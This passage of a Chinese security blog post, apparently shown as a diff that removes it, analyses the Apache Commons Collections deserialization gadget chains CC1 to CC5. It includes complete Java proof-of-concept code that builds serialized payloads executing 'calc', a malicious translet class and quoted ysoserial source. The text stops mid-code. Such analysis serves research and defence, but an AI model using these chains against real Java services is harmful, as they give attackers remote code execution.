-<p>返回Runtime 的 Class 对象，传入到InvokerTransformer对象的transform方法中,相当于<code>InvokerTransformer.transform(Runtime.class)</code></p>
-<pre><code>new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;)
-</code></pre>
-<p>调用Runtime.getMethod去查找getRuntime方法，返回了<code>Runtime.getRuntime</code>这个方法（Method类型）</p>
-<pre><code>new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;)
-</code></pre>
-<p>调用<code>Runtime.getRuntime</code>（Method类型）的<code>invoke</code>方法，返回了<code>Runtime.getMethod()</code>Runtime对象</p>
-<pre><code>new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
-</code></pre>
-<p>调用Runtime对象的<code>exec</code>方法，去执行calc</p>
-<p>然后使用decorate 方法将 ChainedTransformer 设置为 map 的装饰器处理方法后，当调用 TransformedMap 的 put&#x2F;setValue 等方法时会触发 Transformer 链的调用处理。</p>
-<p>截止到这里，我们利用 CC 库成功构造了 sink gadget 和 chain gadget，接下来我们需要找到一个 kick-off gadget：一个类重写了 readObject ，在反序列化时可以改变 map 的值。</p>
-<p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>恰好满足我们的要求，这个类实现了 InvocationHandler 接口，原本是用于 JDK 对于注解形式的动态代理。</p>
-<p><img src="/images/20230425203156.png"></p>
-<p><code>memberTypes</code>里面存储了注解属性的Class Map，key为属性名，value为属性的类型<br><code>memberValues</code>里面存储了注解属性的Value Map，key为属性名，value为属性的值<br>遍历<code>memberValues</code>，如果memberValue中的key也在memberTypes中，并且value既不是memberType的实例，也不是ExceptionProxy的子类对象，就会调用 setValue 方法写入值。</p>
-<p><code>memberTypes</code>是由<code>annotationType</code>的<code>memberTypes</code>方法得到的，<code>annotationType</code>是由<code>AnnotationType.getInstance(type)</code>得到的，而type和memberValues都是在构造器中传入，type需要是Annotation 实现类的 Class 对象，可控。</p>
-<p><img src="/images/20230425204913.png"></p>
-<p>这样kick-off也有了，完整的Gadget链：</p>
-<ul>
-<li>构造一个 AnnotationInvocationHandler 实例，初始化时传入一个注解类和一个 Map，这个 Map 的 key 中要有注解类中存在的属性，但是值不是对应的实例，也不是 ExceptionProxy 对象。</li>
-<li>这个 Map 由 TransformedMap 封装，并调用自定义的 ChainedTransformer 进行装饰。</li>
-<li>ChainedTransformer 中写入多个 Transformer 实现类，用于链式调用，完成恶意操作。</li>
-</ul>
-<p>实现代码：</p>
-<pre><code>public class CC1WithTransformedMap &#123;
-
-    public static String fileName = &quot;CC1withTransformedMap.bin&quot;;
-
-    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException,
-            InstantiationException, IllegalAccessException, IOException &#123;
-
-        Map hashMap = new HashMap();
-        // 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值
-        // 并且这里的值的一定不是属性值的类型
-        hashMap.put(&quot;comments&quot;, 2);
-
-        // 结合 ChainedTransformer
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
-                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
-        &#125;);
-
-
-        Map transformedMap = TransformedMap.decorate(hashMap, null, chain);
-        Class&lt;?&gt; c              = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
-
-        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
-        constructor.setAccessible(true);
-        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class, transformedMap);
-
-        SerializeUtil.write(handler, fileName);
-        SerializeUtil.read(fileName);
-    &#125;
-&#125;
-</code></pre>
-<p><code>Generated.class</code>可以替换为任意注解类，只要修改<code>memberValues</code>的key为注解类的一个属性名就行。</p>
-<h2 id="LazyMap思路"><a href="#LazyMap思路" class="headerlink" title="LazyMap思路"></a>LazyMap思路</h2><p>LazyMap 通过 <strong>get</strong> 方法获取不到 key 的时候触发 Transformer。<br>而<code> AnnotationInvocationHandler</code>的invoke方法可以触发 memberValues 的 <strong>get</strong> 方法。</p>
-<p><img src="/images/20230425210027.png"></p>
-<p>这里用到了动态代理，被动态代理的对象调用任意方法都会调用对应的InvocationHandler 的 <code>invoke</code> 方法。</p>
-<p>构造思路,在使用带有装饰器的 LazyMap 初始化 AnnotationInvocationHandler 之前，先使用 InvocationHandler 代理一下 LazyMap，这样反序列化 AnnotationInvocationHandler 时，调用 LazyMap 值的 任意方法之前会调用代理类的 invoke 方法，触发 LazyMap 的 get 方法。</p>
-<p>有点乱，整理一下：</p>
-<p>反序列化调用readObject方法，readObject方法中memberValues存放着我们LazyMap用InvocationHandler代理的代理类，当执行到memberValues.entrySet()方法时，触发InvocationHandler的invoke方法</p>
-<p><img src="/images/20230425214833.png"></p>
-<p>invoke方法中，会去调用<code>memberValues.get(member)</code>也就是我们LazyMap的get方法，由于map中没有entrySet这个key，触发chain链</p>
-<p><img src="/images/20230425215420.png"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是 CC1 链分析的全部内容了，最后总结一下。</p>
-<ol>
-<li>利用说明：<ul>
-<li>利用 AnnotationInvocationHandler 在反序列化时会触发 Map 的 get&#x2F;set 等操作，配合 TransformedMap&#x2F;LazyMap 在执行 Map 对象的操作时会根据不同情况调用 Transformer 的转换方法，最后结合了 ChainedTransformer 的链式调用、InvokerTransformer 的反射执行完成了恶意调用链的构成。其中 LazyMap 的触发还用到了动态代理机制。</li>
-</ul>
-</li>
-<li>Gadget 总结：<ul>
-<li>kick-off gadget：<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject()</code></li>
-<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
-<li>chain gadget：<code>org.apache.commons.collections.functors.ChainedTransformer#transform()</code></li>
-</ul>
-</li>
-</ol>
-<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="依赖版本"><a href="#依赖版本" class="headerlink" title="依赖版本"></a>依赖版本</h2><pre><code>&lt;dependency&gt;
-    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
-    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
-    &lt;version&gt;4.0&lt;/version&gt;
-&lt;/dependency&gt;
-</code></pre>
-<h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。</p>
-<p>因此，放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue 会根据元素的排序顺序决定出队的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序。<br>s<br>PriorityQueue 支持反序列化，在重写的 readObject 方法中，将数据反序列化到 <code>queue</code> 中之后，会调用 <code>heapify()</code> 方法来对数据进行排序。</p>
-<p><img src="/images/20230425215752.png"></p>
-<p><code>heapify()</code> 方法调用 <code>siftDown()</code> 方法，在 comparator 属性不为空的情况下，调用 <code>siftDownUsingComparator()</code> 方法</p>
-<p><img src="/images/20230425215850.png"></p>
-<p><img src="/images/20230425215843.png"></p>
-<p>在 <code>siftDownUsingComparator()</code> 方法中，会调用 comparator 的 <code>compare()</code> 方法来进行优先级的比较和排序。</p>
-<p><img src="/images/20230425220033.png"></p>
-<h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p>TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来。</p>
-<p>TransformingComparator 看类名就类似 TransformedMap，实际作用也类似，用 Tranformer 来装饰一个 Comparator。也就是说，待比较的值将先使用 Tranformer 转换，再传递给 Comparator 比较。</p>
-<p>TransformingComparator 初始化时配置 Transformer 和 Comparator，如果不指定 Comparator，则使用 <code>ComparableComparator.&lt;Comparable&gt;comparableComparator()</code>。</p>
-<p><img src="/images/20230425220323.png"></p>
-<p>在调用 TransformingComparator 的 <code>compare</code> 方法时，可以看到调用了 <code>this.transformer.transform()</code> 方法对要比较的两个值进行转换，然后再调用 compare 方法比较。</p>
-<p><img src="/images/20230425220202.png"></p>
-<h2 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h2><ul>
-<li>kick-off点：PriorityQueue</li>
-<li>chain点：ChainedTransformer</li>
-<li>sink点：InvokerTransformer</li>
-</ul>
-<p>代码如下</p>
-<pre><code>public class CC2WithChain &#123;
-
-    public static String fileName = &quot;CC2WithChain.bin&quot;;
-
-    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException &#123;
-
-        // 初始化 Transformer
-        ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
-                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;));
-
-        TransformingComparator comparator = new TransformingComparator(chain);
-
-        // 在初始化时不带入 comparator，而是
-        PriorityQueue&lt;String&gt; queue = new PriorityQueue&lt;&gt;(2);
-        queue.add(&quot;1&quot;);
-        queue.add(&quot;2&quot;);
-
-        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
-        field.setAccessible(true);
-        field.set(queue, comparator);
-
-        SerializeUtil.write(queue, fileName);
-        SerializeUtil.read(fileName);
-    &#125;
-
-&#125;
-</code></pre>
-<p>这里需要注意的是，在初始化 PriorityQueue 时没有指定 comparator，而是使用反射写入，这是为了避免在向 queue 中添加内容时触发排序而导致触发恶意 payload。</p>
-<h2 id="ysoserial-CC2"><a href="#ysoserial-CC2" class="headerlink" title="ysoserial CC2"></a>ysoserial CC2</h2><p>ysoserial 的 CC2 没有使用 ChainedTransformer，而直接使用了 InvokerTransformer 配合 TemplatesImpl 直接加载恶意类的 bytecode。</p>
-<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>TemplatesImpl 类位于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，实现了 Serializable 接口，因此它可以被序列化。</p>
-<p>看到<code>newTransformer</code>，调用了<code>getTransletInstance()</code> 方法。</p>
-<p><img src="/images/20230425221326.png"></p>
-<p>该类中存在一个成员属性 <code>_class</code>，是一个 Class 类型的数组，数组里下标为<code>_transletIndex</code> 的类会在 <code>getTransletInstance()</code> 方法中使用 <code>newInstance()</code> 实例化，如果<code>_class</code>、<code>_transletIndex</code>可控，就可以自定义实例化的类。</p>
-<p><img src="/images/20230425221632.png"></p>
-<p>看到<code>defineTransletClasses()</code>方法，会调用自定义的 ClassLoader 去加载 <code>_bytecodes</code> 中的 <code>byte[]</code> ，并且如果这个类的父类为 <code>ABSTRACT_TRANSLET</code> 也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，就会将类成员属性的<code>_transletIndex</code> 设置为当前的i。而<code>defineTransletClasses()</code>在之前<code>getTransletInstance()</code>类中_class不为空时调用，所以形成了可控的调用链。</p>
-<p><img src="/images/!%5B%5D(images/20230425221743.png).png"></p>
-<p>触发逻辑总结：</p>
-<ul>
-<li>创建恶意的 TemplatesImpl 对象，写入 _bytecodes、_name 属性，完成调用 newTransformer 方法触发恶意类的实例化的条件。</li>
-<li>创建 PriorityQueue，由于 TemplatesImpl 不是 Comparable 对象，需要反射将恶意的 TemplatesImpl 对象写入到 PriorityQueue 的 queue 中。</li>
-<li>使用 InvokerTransformer （调用被装饰对象的 newTransformer 方法）创建 TransformingComparator ，并将其赋予到 PriorityQueue 中。</li>
-</ul>
-<p>恶意代码：</p>
-<pre><code>public class CC2WithTemplatesImpl &#123;
-
-    public static String fileName = &quot;CC2WithTemplatesImpl.bin&quot;;
-
-    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
-
-        // 读取恶意类 bytes[]
-        InputStream inputStream = CC2WithTemplatesImpl.class.getResourceAsStream(&quot;ClassForCC2.class&quot;);
-        byte[]      bytes       = new byte[inputStream.available()];
-        inputStream.read(bytes);
-
-        // 初始化 PriorityQueue
-        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
-        queue.add(&quot;1&quot;);
-        queue.add(&quot;2&quot;);
-
-
-        // 初始化 TemplatesImpl 对象
-        TemplatesImpl tmpl      = new TemplatesImpl();
-        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
-        bytecodes.setAccessible(true);
-        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);
-        // _name 不能为空
-        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
-        name.setAccessible(true);
-        name.set(tmpl, &quot;1azy&quot;);
-
-        Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
-        field.setAccessible(true);
-        Object[] objects = (Object[]) field.get(queue);
-        objects[0] = tmpl;
-
-        // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
-        // 这个类是 public 的，方便调用
-        InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
-        TransformingComparator comparator  = new TransformingComparator(transformer);
-
-        Field field2 = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
-        field2.setAccessible(true);
-        field2.set(queue, comparator);
-
-        SerializeUtil.write(queue, fileName);
-        SerializeUtil.read(fileName);
-
-    &#125;
-&#125;
-
-恶意类构造如下，请先编译成class文件：
-
-public class ClassForCC2 extends AbstractTranslet &#123;
-    static &#123;
-        try &#123;
-            Runtime.getRuntime().exec(&quot;calc&quot;);
-        &#125; catch (IOException e) &#123;
-            throw new RuntimeException(e);
-        &#125;
-    &#125;
-
-    public static void main(String[] args) &#123;
-
-    &#125;
-
-
-
-    @Override
-    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
-
-    &#125;
-
-    @Override
-    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
-
-    &#125;
-&#125;
-</code></pre>
-<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol>
-<li>利用说明：<ul>
-<li>利用 PriorityQueue 在反序列化后会对队列进行优先级排序的特点，为其指定 TransformingComparator 排序方法，并在其中为其添加 Transforer，与 CC1 类似，主要的触发位置还是 InvokerTransformer。</li>
-</ul>
-</li>
-<li>Gadget 总结：<ul>
-<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
-<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
-<li>chain gadget：<code>org.apache.commons.collections4.comparators.TransformingComparator#compare()</code></li>
-</ul>
-</li>
-</ol>
-<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>CC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并不相同。</p>
-<p>在 CC1 中，使用了 AnnotationInvocationHandler 对 LazyMap 进行代理，在反序列化时触发 LazyMap 的 get 方法，并对 LazyMap 装饰 Transformer 触发漏洞。</p>
-<p>在 CC2 中，使用 TemplatesImpl 的 newTransformer 方法触发实例化恶意类触发漏洞，方法的调用则是使用了 InvokerTransformer 反射调用。</p>
-<p>而在 CC3 中，使用了 CC1 和 LazyMap 和 CC3 的 TemplatesImpl，中间寻找了其他的触发 newTransformer 的实现方式。</p>
-<h2 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>在 SAX API 中提供了一个过滤器接口 <code>org.xml.sax.XMLFilter</code>，XMLFilterImpl 是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承 XMLFilterImpl，就可以方便的实现自己的功能。</p>
-<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 是对 XMLFilterImpl 的实现，在其基础上扩展了 Templates&#x2F;TransformerImpl&#x2F;TransformerHandlerImpl 属性，</p>
-<p>TrAXFilter 在实例化时接收 Templates 对象，并调用其 newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 了。</p>
-<p><img src="/images/20230425222728.png"></p>
-<h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>有了上述 gadget ，接下来的重点就是需要我们实例化这个 TrAXFilter，实例化我们当然可以使用 InvokerTransformer 反射拿到 Constructor 再 newInstance，但是同样地可以直接使用另外一个 Transformer：InstantiateTransformer。</p>
-<p>Commons Collections 提供了 InstantiateTransformer 用来通过反射创建类的实例，可以看到 <code>transform()</code> 方法实际上接收一个 Class 类型的对象，通过 <code>getConstructor</code> 获取构造方法，并通过 <code>newInstance</code> 创建类实例。</p>
-<p><img src="/images/20230425222809.png"></p>
-<p>反射需要的 iParamTypes 参数类型、iArgs 参数值则在 InstantiateTransformer 初始化时赋值。</p>
-<p><img src="/images/20230425222822.png"></p>
-<h2 id="构造攻击-1"><a href="#构造攻击-1" class="headerlink" title="构造攻击"></a>构造攻击</h2><pre><code>public class CC3 &#123;
-
-    public static String fileName = &quot;CC3.bin&quot;;
-
-    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException &#123;
-
-        // 读取恶意类 bytes[]
-        InputStream inputStream = CC3.class.getResourceAsStream(&quot;ClassForCC2.class&quot;);
-        byte[]      bytes       = new byte[inputStream.available()];
-        inputStream.read(bytes);
-
-        // 初始化 TemplatesImpl 对象
-        TemplatesImpl tmpl      = new TemplatesImpl();
-        Field         bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
-        bytecodes.setAccessible(true);
-        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);
-        // _name 不能为空
-        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
-        name.setAccessible(true);
-        name.set(tmpl, &quot;su18&quot;);
-
-
-        // 结合 ChainedTransformer
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
-                new ConstantTransformer(TrAXFilter.class),
-                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)
-        &#125;);
-
-        // 初始化 LazyMap
-        Map lazyMap     = LazyMap.decorate(new HashMap(),  chain);
-        Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
-        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
-        constructor.setAccessible(true);
-
-        // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
-        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
-        // 创建LazyMap的动态代理类实例
-        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);
-
-        // 使用动态代理初始化 AnnotationInvocationHandler
-        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);
-
-        SerializeUtil.write(invocationHandler, fileName);
-        SerializeUtil.read(fileName);
-    &#125;
-
-&#125;
-</code></pre>
-<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="依赖版本-1"><a href="#依赖版本-1" class="headerlink" title="依赖版本"></a>依赖版本</h2><pre><code>&lt;dependency&gt;
-    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
-    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
-    &lt;version&gt;4.0&lt;/version&gt;
-&lt;/dependency&gt;
-</code></pre>
-<p>ysoserial的CC4是CC2和CC3的结合，用 PriorityQueue 的 TransformingComparator 触发 ChainedTransformer（CC2），而chain中利用了 InstantiateTransformer 实例化 TrAXFilter 类，并调用 TemplatesImpl 的 newTransformer 方法实例化恶意类字节码触发漏洞（CC3）<br>。</p>
-<pre><code>public class CommonsCollections4 implements ObjectPayload&lt;Queue&lt;Object&gt;&gt; &#123;
-
-    public Queue&lt;Object&gt; getObject(final String command) throws Exception &#123;
-        Object templates = Gadgets.createTemplatesImpl(command);
-
-        ConstantTransformer constant = new ConstantTransformer(String.class);
-
-        // mock method name until armed
-        Class[] paramTypes = new Class[] &#123; String.class &#125;;
-        Object[] args = new Object[] &#123; &quot;foo&quot; &#125;;
-        InstantiateTransformer instantiate = new InstantiateTransformer(
-                paramTypes, args);
-
-        // grab defensively copied arrays
-        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, &quot;iParamTypes&quot;);
-        args = (Object[]) Reflections.getFieldValue(instantiate, &quot;iArgs&quot;);
-
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; constant, instantiate &#125;);
-
-        // create queue with numbers
-        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(chain));
-        queue.add(1);
-        queue.add(1);
-
-        // swap in values to arm
-        Reflections.setFieldValue(constant, &quot;iConstant&quot;, TrAXFilter.class);
-        paramTypes[0] = Templates.class;
-        args[0] = templates;
-
-        return queue;
-    &#125;
-</code></pre>
-<p>这里补充一个对 PriorityQueue 的替代链 TreeBag。</p>
-<h2 id="补充前置知识"><a href="#补充前置知识" class="headerlink" title="补充前置知识"></a>补充前置知识</h2><h3 id="TreeBag-amp-TreeMap"><a href="#TreeBag-amp-TreeMap" class="headerlink" title="TreeBag &amp; TreeMap"></a>TreeBag &amp; TreeMap</h3><p>在 CC2 中，使用了优先级队列 PriorityQueue 反序列化时会调用 comparator 的 compare 方法的特性，配合 TransformingComparator 触发 transformer。</p>
-<p>除了 PriorityQueue，还能否找到其他的提供排序的类，在反序列化时会调用到比较器呢？于是找到了 TreeBag。</p>
-<p>对于 Bag 我很陌生，所以这里简单介绍一下。</p>
-<p>Bag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。</p>
-<p>TreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。</p>
-<p>TreeBag 继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中。</p>
-<p>看到TreeBag#readObject，会调用super.doReadObject</p>
-<p><img src="/images/20230504160412.png"></p>
-<p>调用 put 向 TreeMap中存放数据</p>
-<p><img src="/images/20230504160549.png"></p>
-<p>在TreeMap#put中会调用compare去比较key</p>
-<p><img src="/images/20230504160703.png"></p>
-<p>而compare中就会调用<code>comparator</code> 进行比较，可以使用 <code>TransformingComparator</code> 触发后续的逻辑。</p>
-<p><img src="/images/20230504160744.png"></p>
-<h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC4WithTreeBag &#123;
-
-    public static String fileName = &quot;CC4WithTreeBag.bin&quot;;
-
-    public static void main(String[] args) throws Exception &#123;
-
-        // 读取恶意类 bytes[]
-        InputStream inputStream = CC4WithTreeBag.class.getResourceAsStream(&quot;ClassForCC2.class&quot;);
-        byte[]      bytes       = new byte[inputStream.available()];
-        inputStream.read(bytes);
-
-        // 初始化 TemplatesImpl 对象
-        TemplatesImpl tmpl      = new TemplatesImpl();
-        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
-        bytecodes.setAccessible(true);
-        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);
-        // _name 不能为空
-        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
-        name.setAccessible(true);
-        name.set(tmpl, &quot;1azy&quot;);
-
-        // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
-        // 这个类是 public 的，方便调用
-        Transformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
-        TransformingComparator comparator  = new TransformingComparator(transformer);
-
-        // prepare CommonsCollections object entry point
-        TreeBag tree = new TreeBag(comparator);
-        tree.add(tmpl);
-
-        Field field = InvokerTransformer.class.getDeclaredField(&quot;iMethodName&quot;);
-        field.setAccessible(true);
-        field.set(transformer, &quot;newTransformer&quot;);
-
-        SerializeUtil.write(tree, fileName);
-        SerializeUtil.read(fileName);
-    &#125;
-&#125;
-</code></pre>
-<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>ysoserial CC4：</p>
-<ol>
-<li>利用说明：<ul>
-<li>使用 PriorityQueue 反序列化时触发的 TransformingComparator 的 compare 方法，就会触发 ChainedTransformer 的 tranform 方法链，其中利用 InstantiateTransformer 实例化 TrAXFilter 类，此类实例化时会调用 TemplatesImpl 的 newTransformer 实例化恶意类，执行恶意代码。</li>
-</ul>
-</li>
-<li>Gadget 总结：<ul>
-<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
-<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
-<li>chain gadget：<code>org.apache.commons.collections.functors.InstantiateTransformer#transform()</code></li>
-</ul>
-</li>
-</ol>
-<p>TreeBag 总结：</p>
-<ol>
-<li>利用说明：<ul>
-<li>用 TreeBag 代替 PriorityQueue 触发 TransformingComparator，后续依旧使用 Transformer 的调用链。</li>
-</ul>
-</li>
-<li>Gadget 总结：<ul>
-<li>kick-off gadget：<code>org.apache.commons.collections4.bag.TreeBag#readObject</code></li>
-<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
-<li>chain gadget：<code>java.util.TreeMap#put()</code></li>
-</ul>
-</li>
-</ol>
-<h1 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h1><p>CC5 依旧是 LazyMap 加 ChainedTransformer 的触发模式，只不过不再使用 AnnotationInvocationHandler 的动态代理来触发 LazyMap 的 get ，而是找到了其他的方式。</p>
-<blockquote>
-<p>jdk 在 1.8 之后对 AnnotationInvocationHandler 类进行了修复，所以在 jdk 1.8 版本就必须找出能替代 AnnotationInvocationHandler 的新的可以利用的类。</p>
-</blockquote>
-<h2 id="依赖版本-2"><a href="#依赖版本-2" class="headerlink" title="依赖版本"></a>依赖版本</h2><blockquote>
-<p>commons-collections : 3.1～3.2.1<br>jdk 8u76 without a security manager</p>
-</blockquote>
-<h2 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 是一个 <code>Map.Entry</code> 的实现类，从名称中可以看到，这是一个绑定了底层 map 的 Entry，用来使一个 map entry 对象拥有在底层修改 map 的功能。</p>
-<p>TiedMapEntry 中有一个成员属性 Map，这就是 <code>Map.Entry</code> 的底层 map，TiedMapEntry 的 <code>getValue()</code> 方法会调用底层 map 的 <code>get()</code> 方法，我们可以用来触发 LazyMap 的 get。那谁会调用 <code>getValue()</code> 方法呢？我们发现 TiedMapEntry 的 equals&#x2F;hashCode&#x2F;toString 都可以触发。</p>
-<pre><code>public String toString() &#123;
-    return getKey() + &quot;=&quot; + getValue();
-&#125;
-
-public Object getValue() &#123;
-    return map.get(key);
-&#125;
-</code></pre>
-<p>接下来需要找到一个类在反序列化时会触发 TiedMapEntry 的 toString() 方法。</p>
-<h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>于是找到了 <code>javax.management.BadAttributeValueExpException</code> 这个类，反序列化读取 val，当 <code>System.getSecurityManager() == null</code> 或 valObj 是除了 String 的其他基础类型时会调用 valObj 的 <code>toString()</code> 方法，完成上面 TiedMapEntry 的构造。</p>
-<pre><code>private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;
-        ObjectInputStream.GetField gf = ois.readFields();
-        Object valObj = gf.get(&quot;val&quot;, null);
-
-        if (valObj == null) &#123;
-            val = null;
-        &#125; else if (valObj instanceof String) &#123;
-            val= valObj;
-        &#125; else if (System.getSecurityManager() == null
-                || valObj instanceof Long
-                || valObj instanceof Integer
-                || valObj instanceof Float
-                || valObj instanceof Double
-                || valObj instanceof Byte
-                || valObj instanceof Short
